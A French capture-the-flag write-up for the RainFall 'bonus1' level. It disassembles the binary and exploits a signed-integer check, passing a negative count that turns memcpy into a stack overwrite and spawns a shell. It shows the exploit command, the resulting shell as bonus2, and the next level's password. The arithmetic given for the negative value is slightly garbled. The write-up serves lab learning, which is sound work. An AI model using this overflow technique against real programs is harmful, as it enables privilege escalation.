## Démarches

- le binaire `bonus1` prend 2 arguments


```
08048424 <main>:
 8048424:	55                   	push   %ebp
 8048425:	89 e5                	mov    %esp,%ebp
 8048427:	83 e4 f0             	and    $0xfffffff0,%esp
 804842a:	83 ec 40             	sub    $0x40,%esp
 804842d:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048430:	83 c0 04             	add    $0x4,%eax
 8048433:	8b 00                	mov    (%eax),%eax
 8048435:	89 04 24             	mov    %eax,(%esp)
 8048438:	e8 23 ff ff ff       	call   8048360 <atoi@plt>
 804843d:	89 44 24 3c          	mov    %eax,0x3c(%esp)
 8048441:	83 7c 24 3c 09       	cmpl   $0x9,0x3c(%esp)
 8048446:	7e 07                	jle    804844f <main+0x2b>
 8048448:	b8 01 00 00 00       	mov    $0x1,%eax
 804844d:	eb 54                	jmp    80484a3 <main+0x7f>
 804844f:	8b 44 24 3c          	mov    0x3c(%esp),%eax
 8048453:	8d 0c 85 00 00 00 00 	lea    0x0(,%eax,4),%ecx
 804845a:	8b 45 0c             	mov    0xc(%ebp),%eax
 804845d:	83 c0 08             	add    $0x8,%eax
 8048460:	8b 00                	mov    (%eax),%eax
 8048462:	89 c2                	mov    %eax,%edx
 8048464:	8d 44 24 14          	lea    0x14(%esp),%eax
 8048468:	89 4c 24 08          	mov    %ecx,0x8(%esp)
 804846c:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048470:	89 04 24             	mov    %eax,(%esp)
 8048473:	e8 a8 fe ff ff       	call   8048320 <memcpy@plt>
 8048478:	81 7c 24 3c 46 4c 4f 	cmpl   $0x574f4c46,0x3c(%esp)
 804847f:	57
 8048480:	75 1c                	jne    804849e <main+0x7a>
 8048482:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
 8048489:	00
 804848a:	c7 44 24 04 80 85 04 	movl   $0x8048580,0x4(%esp)
 8048491:	08
 8048492:	c7 04 24 83 85 04 08 	movl   $0x8048583,(%esp)
 8048499:	e8 b2 fe ff ff       	call   8048350 <execl@plt>
 804849e:	b8 00 00 00 00       	mov    $0x0,%eax
 80484a3:	c9                   	leave
 80484a4:	c3                   	ret
```

- le programme alloue un buffer puis vérifie que le premier paramètre est inférieur à 10, dans ce cas :
  - il `memcpy` le second argument
  - puis si la variable contenant le premier paramètre contient une valeur donnée (`0x574f4c46` soit *WOLF* en ascii),
  - il exécute un shell

- Pour passer la première condition (`i < 10`), on peut utiliser un nombre négatif
- Ce nombre négatif sera multiplié par un `unsigned int` dans l'appel du memcpy et deviendra un nombre positif,
- Peda nous aide à déterminer que le buffer du memcpy fait 40 char de long (0x3c),
- Pour overwrite `i`, on doit donc écrire 40 + 4 caractères,
- On passe donc 40 dans le premier paramètre, via un nombre négatif transformé par atoi en signed int :

    - 4 294 967 295 est le nombre maximum contenu dans un unsigned int (2^32 − 1 *ou* FFFFFFFF)
    - (-4294967295 - 40) / 4 = -1073741813
    > -1073741813

Donc -1073741813 puis 40 caractères de padding puis la chaine voulue à l'envers (`WOLF` -> `FLOW`)
```
    bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print("A"*40+"FLOW")')
    $ pwd
    /home/user/bonus1
    $ whoami
    bonus2
    $ cat /home/user/bonus2/.pass
    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
    $ exit
```

<br>
----
## Ressources

- https://lambdahackulus.wordpress.com/2012/07/30/signed-comparison-vulnerabilities/
- https://aticleworld.com/signed-and-unsigned-integers/